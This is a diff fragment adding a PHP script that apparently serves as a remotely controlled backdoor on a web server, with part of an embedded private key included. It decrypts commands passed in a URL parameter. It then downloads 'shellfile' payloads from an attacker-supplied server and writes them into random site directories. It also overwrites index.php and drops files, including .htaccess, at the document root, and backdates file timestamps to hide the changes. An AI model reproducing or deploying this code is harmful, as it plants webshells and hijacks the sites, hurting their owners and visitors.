+GkMIYtnaTAKPQ8jns37SJXCsmRRhBNf05i20ABsDtAQ/ITIwopmAAPhhR3IGdCfL
+bwyqGcEOq9xZB9tW965YJk7KplLl94qNXtR8Cu5zxc6UDktjHBRk/Ky/FXJOjPKM
+sA8rhox7dqlZUB3I/qiqrQOgT1Bsq1BFT+2GGwRUWZ1CyFoZvhsDomdo4yhRrB0b
+8Ym4MDiVqxFPVW8XB9RFD9YKt+v50Eb6iSKJNLpRmjZDNZbrEYO6NRsRBM7brDa9
+n39mZWFr47wGGXXv/NhwTvRI+2Si/ZfdP4+o5TeSWQKBgQDhIVOUODisiLhk7XKb
+Yu7BW1ZFcK0JxurqHN22msvA0Q/1q4RvziETjekXIn9lVKCmS/gy2O2RtuQRulAR
+fc3sz2W9tNXRF8Avy0728NG0baOOwBalO8w3cCX6Nnm70pJer+iJSn3tmAKSB4LT
+vbSB8pt6QgP8NPHyQdWp2LwOtwKBgQDRB8lgSaImIMJBaXERSaoNg8kxv3/cv4g5
+jUlljxNQcUsj0V7XilnB3mFxq5rHjBZTsKzMMQyvhOxYhptDfw6OLtoPUk2WiBUs
+l3qU0tIXNN+cTxu2SMKTjwMktkpmACJqa+k27eEUqxrKO/6SEiP9FMXHvgA4EEBM
+Hww1eU9QqwKBgAWSY5Uphw2OHLIyxkFeQ3Z5ojr5vO6fA7VjnYEld6GACxsTcaWq
+vlrTik9ORUTmwUscWjo38DlJA4AE0nJ8YJpZz7TQQvJ32gPUzlGCSE5k4EVqL6VL
+Q5Sjq+zzaDPj1EePpvuu4kr9FiMzGGPRMCR/MqXl+F9HmC1cv8MCYDUlAoGBAK77
+g7pVKaYdWkCD0iEUt4Rkw/IfSxwyQglbmwungBWhIbO0O17X9Fd0n8IWU5WkUbRx
+e9XbYbE05t0cobEZFcg0tFqLHWRcOs1/aSBYc4L1whMJrjskIa6A07LR3uoQRr8r
+4qkW7YrtyZluK6eABByCXSbeiTRldk3C1+eTy6/NAoGAb9/J+NWrhYSr/VoGWjui
+chXCNszy4w6exVwxXQKNTtlzKxyhQfVPK2BxrptWL6KCRKpz3wh+WY2C3QYyVfwG
+FB4hwDr2mY4TWF9pD194iES1yhrQGlI8XM+2LVhBl3p0x+TFgJMaTgDDqAnxpuqT
+upBYqTYMlOd+VR7hENMaFqo=
+-----END PRIVATE KEY-----';
+$p = $_GET['p'];
+$params = openssl_private_decrypt(base64_decode(urldecode($p)), $decrypted, $privateKey) ? $decrypted : null;
+if (is_null($params)) {
+    error(MsgText::DECRYPT_FAIL);
+}
+$params = json_decode($params, true);
+if (!is_array($params)) {
+    error(MsgText::PARAM_TYPE, $params);
+}
+if (empty($params['server'])) {
+    error('server ' . MsgText::PARAM_EMPTY);
+}
+if (empty($params['iden'])) {
+    error('iden ' . MsgText::PARAM_EMPTY);
+}
+$iden = isset($params['iden']) ? strtolower($params['iden']) : '';
+switch ($iden) {
+    case "beima":
+        $res = doBeima($params);
+        break;
+    case "rename":
+        $res = doRename($params);
+        break;
+    case "index":
+        $res = doIndex($params);
+        break;
+    case "sub":
+    case "htaccess":
+        $res = doSub($params);
+        break;
+    case "lock":
+        $res = doLock($params);
+        break;
+    case "style":
+        $res = doStyle($params);
+        break;
+    default:
+        error('iden ' . MsgText::VALUE_ERROR);
+}
+function doBeima($params)
+{
+    if (empty($params['filename'])) {
+        error('filename ' . MsgText::PARAM_EMPTY, $params);
+    }
+    if (empty($params['shellfile'])) {
+        error('shellfile ' . MsgText::PARAM_EMPTY, $params);
+    }
+    empty($params['level']) && $params['level'] = 6;
+    $dirs = getDirPathsByLevel($params['level']);
+    $temp = array_rand($dirs);
+    $createDir = $dirs[$temp] . '/';
+    $localfilepath = $createDir . $params['filename'];
+    $remoteFileUrl = $params['server'] . $params['shellfile'];
+    $content = getRemoteContent($remoteFileUrl);
+    $content = json_decode($content, true);
+    if (!empty($content['result'])) {
+        if (copyfile($content['result'], $localfilepath)) {
+            updateFiletime($localfilepath);
+            $beimaurl = str_replace($_SERVER['DOCUMENT_ROOT'], '', $localfilepath);
+            success(compact('localfilepath', 'beimaurl'));
+        }
+        error(MsgText::LOCAL_FILE_ERROR, compact('localfilepath'));
+    }
+    error(MsgText::REMOTE_FILE_EXISTS, compact('remoteFileUrl'));
+}
+function doRename($params)
+{
+    if (empty($params['sourcename'])) {
+        error('sourcename ' . MsgText::PARAM_EMPTY, $params);
+    }
+    if (empty($params['rename'])) {
+        error('rename ' . MsgText::PARAM_EMPTY, $params);
+    }
+    if ($params['sourcename'] === $params['rename']) {
+        error(MsgText::NOCHANGE);
+    }
+    $sourceFile = dirname(__FILE__) . DIRECTORY_SEPARATOR . $params['sourcename'];
+    $renameFile = dirname(__FILE__) . DIRECTORY_SEPARATOR . $params['rename'];
+    $resSource = $params['server'] . str_replace(strtolower($_SERVER['DOCUMENT_ROOT']), '', strtolower($sourceFile));
+    $resSource = str_replace('\\', '/', $resSource);
+    if (file_exists($sourceFile)) {
+        if (rename($sourceFile, $renameFile)) {
+            success($renameFile);
+        } else {
+            error(MsgText::RENAME_ERROR, compact('renameFile'));
+        }
+    } else {
+        error(MsgText::LOCAL_FILE_EXISTS, compact('resSource'));
+    }
+}
+function doIndex($params)
+{
+    if (empty($params['shellfile'])) {
+        error('shellfile ' . MsgText::PARAM_EMPTY, $params);
+    }
+    $remoteUrl = $params['server'] . trim($params['shellfile']);
+    $localfilepath = $_SERVER['DOCUMENT_ROOT'] . '/index.php';
+    $content = getRemoteContent($remoteUrl);
+    $content = json_decode($content, true);
+    if (!empty($content['result'])) {
+        $oldContent = '';
+        if (file_exists($localfilepath)) {
+            $oldContent = @file_get_contents($localfilepath);
+        } elseif (file_exists($_SERVER['DOCUMENT_ROOT'] . '/index.html')) {
+            $oldContent = @file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/index.html');
+        } elseif (file_exists($_SERVER['DOCUMENT_ROOT'] . '/index.htm')) {
+            $oldContent = @file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/index.htm');
+        } elseif (file_exists($_SERVER['DOCUMENT_ROOT'] . '/default.html')) {
+            $oldContent = @file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/default.html');
+        } elseif (file_exists($_SERVER['DOCUMENT_ROOT'] . '/default.htm')) {
+            $oldContent = @file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/default.htm');
+        }
+        if (copyfile($content['result'], $localfilepath, true, $oldContent)) {
+            updateFiletime($localfilepath);
+            @chmod($localfilepath, 0644);
+            success($localfilepath);
+        }
+        error(MsgText::LOCAL_FILE_ERROR, compact('localfilepath'));
+    }
+    error(MsgText::INDEX_ERROR, compact('remoteUrl'));
+}
+function doSub($params)
+{
+    if (empty($params['shellfile'])) {
+        error('shellfile' . MsgText::PARAM_EMPTY, $params);
+    }
+    if (empty($params['filename'])) {
+        error('filename ' . MsgText::PARAM_EMPTY, $params);
+    }
+    $localfilepath = $_SERVER['DOCUMENT_ROOT'] . '/' . $params['filename'];
+    $remoteFileUrl = $params['server'] . $params['shellfile'];
+    $content = getRemoteContent($remoteFileUrl);
+    $content = json_decode($content, true);
+    if (!empty($content['result'])) {
+        if (copyfile($content['result'], $localfilepath)) {
+            updateFiletime($localfilepath);
+            @chmod($localfilepath, 0644);
+            success($localfilepath);
+        }
+        error(MsgText::LOCAL_FILE_ERROR, compact('localfilepath'));
+    }
+    error(MsgText::REMOTE_GET_ERROR, compact('remoteFileUrl'));
+}
+function doLock($params)
+{
+    if (empty($params['filename'])) {
+        error('filename ' . MsgText::PARAM_EMPTY, $params);
+    }
+    if (empty($params['domain'])) {
+        error('domain ' . MsgText::PARAM_EMPTY, $params);
+    }
+    if (empty($params['shellfile'])) {
+        error('shellfile ' . MsgText::PARAM_EMPTY, $params);
+    }
+    $localfilepath = $_SERVER['DOCUMENT_ROOT'] . '/' . $params['filename'];
+    $remoteFileUrl = $params['server'] . $params['shellfile'];
+    $content = getRemoteContent($remoteFileUrl);
+    $content = json_decode($content, true);
+    if (!empty($content['result'])) {
+        if (copyfile($content['result'], $localfilepath)) {
+            $lockurl = $params['domain'] . $params['filename'];
+            $lockres = getUrl($lockurl);
+            @unlink($localfilepath);
+            if ($lockres['code'] === 200 && !empty($lockres['resp']) && strpos($lockres['resp'], 'success')) {
+                success($lockres['resp']);
+            }
+            error(MsgText::LOCK_FILE_SUCCESS, compact('lockurl', 'lockres'));
+        }
+        @unlink($localfilepath);
+        error(MsgText::LOCK_FILE_ERROR, compact('localfilepath'));
+    }
+    error(MsgText::REMOTE_GET_ERROR, compact('remoteFileUrl'));
+}
+function doStyle($params)
+{
+    if (empty($params['shellfile'])) {
+        error('shellfile' . MsgText::PARAM_EMPTY, $params);
+    }
+    if (empty($params['filename'])) {
+        error('filename ' . MsgText::PARAM_EMPTY, $params);
+    }
+    if (empty($params['domain'])) {
+        error('domain ' . MsgText::PARAM_EMPTY, $params);
+    }
+    $localfilepath = $params['domain'] . $params['filename'];
+    $remoteFileUrl = $params['server'] . $params['shellfile'];
+    $content = getRemoteContent($remoteFileUrl);
+    $content = json_decode($content, true);
+    if (!empty($content['result'])) {
+        if (copyfile($content['result'], $localfilepath)) {
+            updateFiletime($localfilepath);
+            @chmod($localfilepath, 0644);
+            success($localfilepath);
+        }
+        error(MsgText::LOCAL_FILE_ERROR, compact('localfilepath'));
+    }
+    error(MsgText::REMOTE_GET_ERROR, compact('remoteFileUrl'));
+}
